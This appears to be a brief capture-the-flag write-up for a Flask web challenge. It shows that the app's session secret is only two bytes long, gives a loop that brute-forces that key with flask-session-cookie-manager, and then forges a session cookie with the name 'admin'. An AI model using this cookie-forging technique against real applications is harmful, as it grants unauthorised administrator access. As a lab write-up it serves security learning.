Looking at the code in `app.py` we see that the secret is just two bytes long:

```
def generate_random_key():
    key = randbytes(1)
    key += choice(ascii_lowercase).encode("ascii")
    return key
```

This makes it brute forceable. We can use https://github.com/noraj/flask-session-cookie-manager to do this.

Find the right key:
```
for x in range(256):
  for y in range(256):
    print(x,y,FSCM.decode(cookie_value, chr(x)+chr(y)))
```

Once we know the two bytes, we create a new session with that key and `admin` as name:
```
print(FSCM.encode(chr(19)+chr(120), "{'name': 'admin'}"))
```
